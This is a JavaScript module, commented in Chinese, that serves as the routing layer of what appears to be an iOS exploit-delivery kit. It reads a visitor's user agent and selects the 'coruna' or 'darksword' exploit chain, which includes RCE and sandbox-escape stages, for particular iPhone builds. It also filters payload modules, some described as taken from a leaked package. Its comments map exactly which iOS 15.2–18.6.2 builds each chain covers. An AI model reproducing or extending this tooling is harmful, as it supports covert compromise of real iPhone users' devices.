/**
 * 链路由层 —— 按设备 iOS 版本选择利用链
 *
 * 版本矩阵**以两条链的实际偏移表为准**（已逐表枚举核实，非 README 口径）：
 *
 * coruna（platform_module.js versionOffsetTable）—— **本文件未改动其结论**：
 *   LTgSl5  runtime: 13 条，minVersion 100000 … 170300
 *   PSNMWj  runtime: 19 条，minVersion 100000 … 170000
 *   RoAZdq  runtime:  5 条，minVersion 100000 … 150000
 *   选择逻辑：`if (r.GFx77t > platformState.iOSVersion) break;` —— GFx77t 是
 *   **minVersion 下界**，不是上界。表内最高条目为 PSNMWj 的 170000，
 *   真机（CPU_TYPE_ARM64）走 PSNMWj；LTgSl5 是初始/模拟器表（x86_64）。
 *   → 真机有效上界取 17.2.1（文件覆盖上界口径），17.3+ 不默认放行。
 *   【独立复核】三表条目数 19/13/5 与最高 minVersion 170000/170300/150000
 *   已用脚本重新枚举确认，与本文件原结论一致，故 coruna 分支保持原样。
 *
 * darksword（rce_module.js linkedit_to_device + sbx0_main_18.4.js sbx0_offsets）：
 *   6 个版本键：18,4 / 18,4,1 / 18,5 / 18,6 / 18,6,1 / 18,6,2
 *   对应 build：22E240 / 22E252 / 22F76 / 22G86 / 22G90 / 22G100
 *   每个版本键 26 个 iPhone 机型（每 build 26 机型 × 6 build = 156 键）
 *
 * 【2026-09-26 修正 —— 修正前一版本结论为假】
 *   修正前本文件断言：
 *     "sbx0_offsets 只有 52 个键 = 26 机型 × 仅 22E240 / 22E252 两个 build，
 *      18.5+ 查表必 miss → 只能走前段"
 *   该断言**错误**，根因是**只静态读了 `sbx0_main_18.4.js` L28 的对象字面量，
 *   漏掉了其后两次运行时合并**：
 *     L28   `sbx0_offsets = { … }`                    → 52 键（22E240 / 22E252）
 *     L2215 `sbx0_offsets = Object.assign(sbx0_offsets, { … })` → +26 键（22F76）
 *     L3310 `sbx0_offsets = Object.assign(sbx0_offsets, { … })` → +78 键（22G86/22G90/22G100）
 *   合并后运行时实际为 **156 键 = 26 机型 × 6 build**，6 个 build 全覆盖。
 *
 *   同时不存在"键格式错配"：`rce_module.js` 的 `linkedit_to_device` 返回值
 *   形如 `"iPhone11,2_4_6_22E240"`（复合机型 + build 后缀），与 `sbx0_offsets`
 *   的键格式**完全一致**。已用脚本做双向差集比对：156 值 vs 156 键，
 *   两侧差集均为 0，即**精确双射**。故 18.5/18.6.x 查表不会 miss。
 *
 *   结论：darksword 在 18,4 … 18,6,2 全区间**均可走完全链**，不再区分
 *   prefix-only。`partialFrom` 已移除。
 *
 * 两条链均**仅支持 iPhone**：
 *   - coruna 全库无任何机型字符串（按版本+runtime 选择，与机型无关）
 *   - darksword linkedit_to_device 机型列表无 iPad/iPod
 */

export const CHAINS = {
  coruna: {
    min: [15, 2, 0],
    /**
     * 上界依据（已双重核实）：
     *  - `PSNMWj`（真机 arm64 主表）最高 minVersion = **170000 (iOS 17.0)**
     *  - `LTgSl5`（初始/模拟器表）最高 170300，但真机不以此表为最终态
     *  - 真机 detectRuntime() 会把 LTgSl5 换成 PSNMWj（CPU_TYPE_ARM64）
     *  故真机实际有效上界取 **17.2.1**（文件名覆盖上界），17.3+ 不默认放行。
     */
    max: [17, 2, 1],
    iphoneOnly: true,
    deviceAgnostic: true,
  },
  darksword: {
    min: [18, 4, 0],
    /**
     * 上界依据（已重新论证）：
     *  - `linkedit_to_device` 共 6 个版本键，最高为 `'18,6,2'`
     *  - 对应 build `22G100`，且该 build 的 26 个机型键**确实存在于**
     *    合并后的 `sbx0_offsets`（156 键 / 6 build 全覆盖，已脚本核实）
     *  故 18.6.2 是该表能表达的**最高精确版本**，取为 max。
     *  注意：这是"表能覆盖到的最高版本"，不等于"18.7 一定不可用"——
     *  18.7+ 无对应版本键，无法查表，故不默认放行（与 coruna 同处理）。
     */
    max: [18, 6, 2],
    iphoneOnly: true,
  },
};

/** darksword 精确的版本键与 build 映射（用于诊断与日志） */
export const DARKSWORD_VERSION_BUILDS = {
  '18,4':   '22E240',
  '18,4,1': '22E252',
  '18,5':   '22F76',
  '18,6':   '22G86',
  '18,6,1': '22G90',
  '18,6,2': '22G100',
};

/**
 * sbx0_offsets **运行时实际覆盖**的 build。
 *
 * 推导来源（不是人工枚举，而是从 sbx0_main_18.4.js 静态结构还原运行时状态）：
 *   L28   `sbx0_offsets = { … }`                              → 22E240 / 22E252
 *   L2215 `sbx0_offsets = Object.assign(sbx0_offsets, { … })`  → 22F76
 *   L3310 `sbx0_offsets = Object.assign(sbx0_offsets, { … })`  → 22G86 / 22G90 / 22G100
 * 合并后 156 键 = 26 机型 × 6 build，与 DARKSWORD_VERSION_BUILDS 的取值集合一致。
 *
 * ★ 修正记录：修正前本常量硬编码为 `['22E240','22E252']`，属于**假断言**
 *   （漏算两次 Object.assign），已改为由 DARKSWORD_VERSION_BUILDS 推导，
 *   使"覆盖的 build"与"版本键映射到的 build"永远同源、不会再分叉。
 */
export const SBX0_COVERED_BUILDS = Object.freeze(
  Array.from(new Set(Object.values(DARKSWORD_VERSION_BUILDS)))
);

/**
 * 18.6 的 RCE 阶段在 18.6 上**确实缺失**：
 *   `rce_module_18.6.js` = **85 字节存根**，只有一个 `dummyy(x)` 函数
 *   → RCE 阶段（阶段②）在 18.6 上根本不存在。
 * ★ 但此事实**不影响** sbx0 查表覆盖（156 键已含 22G86/22G90/22G100）。
 *   即：18.6 的阻断点在 **RCE 阶段**，不在 **沙箱逃逸查表阶段**。
 *   修正前把"查表 miss"当作 18.6 的阻断原因，是**错误归因**。
 */
export const DARKSWORD_186_RCE_STUB = true;

/**
 * 判断某 iOS 版本在 darksword 下能**走完**全链。
 *
 * ★ 修正后语义：sbx0 查表阶段对 6 个 build **全覆盖**，因此只要版本能被
 *   `DARKSWORD_VERSION_BUILDS` 解析出 build，沙箱逃逸查表就不会 miss，
 *   一律返回 `full`。不再存在 prefix-only 分支。
 *
 * 注意（保留的独立阻断，未在本函数建模）：
 *   18.6 仍受 `DARKSWORD_186_RCE_STUB` 影响——它阻断在**更早的 RCE 阶段**，
 *   与查表覆盖无关。调用方若需要 18.6 的可用性结论，必须**单独**检查该常量，
 *   不要指望本函数的 reach 字段反映它。
 */
export function darkswordStageReach(version) {
  const key = version.slice(0, 3).join(',').replace(/,0$/, '');
  const build = DARKSWORD_VERSION_BUILDS[key]
    || DARKSWORD_VERSION_BUILDS[version.slice(0, 2).join(',')];
  if (!build) return { build: null, reach: 'unsupported' };
  return SBX0_COVERED_BUILDS.includes(build)
    ? { build, reach: 'full' }
    : { build, reach: 'unsupported' };
}

/** 三段版本号比较，缺失段按 0 处理 */
function cmp(a, b) {
  const n = Math.max(a.length, b.length);
  for (let i = 0; i < n; i++) {
    const x = a[i] || 0;
    const y = b[i] || 0;
    if (x !== y) return x < y ? -1 : 1;
  }
  return 0;
}

/** 从 UA 解析 iOS 版本，如 "iPhone OS 18_5" -> [18,5]；非 iOS 返回 null */
export function parseIosVersion(ua) {
  if (!ua) return null;
  const m = /iPhone OS (\d+)[._](\d+)(?:[._](\d+))?/i.exec(ua);
  if (!m) return null;
  return [Number(m[1]), Number(m[2]), Number(m[3] || 0)];
}

/** 是否 iPhone（两条链均无 iPad/iPod 偏移） */
export function isIphone(ua) {
  return /iPhone/.test(ua || '');
}

/**
 * ★ 已知覆盖空档：iOS 17.3.0 – 18.3.9（裁决 ①「接受并显式登记」，⌛2026-10-03）
 *
 * 该区间（含 17.3.0 与 18.3.9）**无任何可用链**，pickChain 一律返回 null。
 *
 * 取证（2026-10-03，两链逐表枚举核实，非 README 口径）：
 *   - coruna：三表 minVersion 全域最高仅 **170300**（`LTgSl5`，CPU_TYPE_X86_64/模拟器表）；
 *     真机表 `PSNMWj` 最高 **170000**（iOS 17.0）。⇒ 真机有效上界 17.2.1。
 *   - darksword：`DARKSWORD_VERSION_BUILDS` 仅 18,4 / 18,4,1 / 18,5 / 18,6 / 18,6,1 / 18,6,2；
 *     且 `rce_module_18.6.js` 为 85 字节存根。⇒ 有效下界 18.4.0。
 *   ⇒ 17.3.0–18.3.9 在 `05-ios/**` 与 `templates/**` 内**不存在**偏移表/模块条目，
 *     即**没有"未接入而可接"的素材**（故未采取"接链"处置）。
 *
 * 处置：**接受该空档**（不接链）。调用方对 17.3–18.3.9 应回 unsupported，**不得回退**。
 * ★ 红线：**禁止**为使本区间返回非 null 而放宽 `CHAINS` 的 min/max —— 那会让不支持的
 *   设备走上**错误的链**。若将来拿到该区间的真实素材，须**先取证再单独提卡**。
 */

/**
 * 选择利用链。
 * @param {string} ua  navigator.userAgent
 * @returns {{chain:string, partial:boolean, version:number[], build:string|null, reach:string}|null}
 *          null 表示不支持（调用方应回 unsupported，不得回退）
 */
export function pickChain(ua) {
  if (!isIphone(ua)) return null;              // iPhone only
  const v = parseIosVersion(ua);
  if (!v) return null;

  for (const [chain, c] of Object.entries(CHAINS)) {
    if (cmp(v, c.min) < 0 || cmp(v, c.max) > 0) continue;

    if (chain === 'darksword') {
      const { build, reach } = darkswordStageReach(v);
      if (reach === 'unsupported') continue;   // 版本键无法解析 → 换链/落空
      return { chain, partial: false, version: v, build, reach };
    }
    return { chain, partial: false, version: v, build: null, reach: 'full' };
  }
  // null ⇒ 不支持：17.3.0–18.3.9（已知覆盖空档，见上）、18.7+、非 iPhone、版本解析失败。
  return null;
}

/**
 * 判断某个链条目名是否属于指定链（供 config-builder 过滤 Payload）。
 *
 * 命名约定（已核实实际文件名）：
 *   darksword : ds_ 前缀（ds_rce_loader / ds_sbx0 / ...）
 *   coruna    : coruna_ 前缀（基础模块）
 *               或 Stage1_/Stage2_/Stage3_ 前缀（阶段模块）
 *               或 40 位 hex（泄漏包内的模块分片）
 */
export function moduleBelongsToChain(name, chain) {
  if (!name) return false;
  if (chain === 'darksword') return name.startsWith('ds_');
  if (chain === 'coruna') {
    return name.startsWith('coruna_')
        || name.startsWith('Stage1_')
        || name.startsWith('Stage2_')
        || name.startsWith('Stage3_')
        || /^[0-9a-f]{40}$/.test(name);
  }
  return false;
}
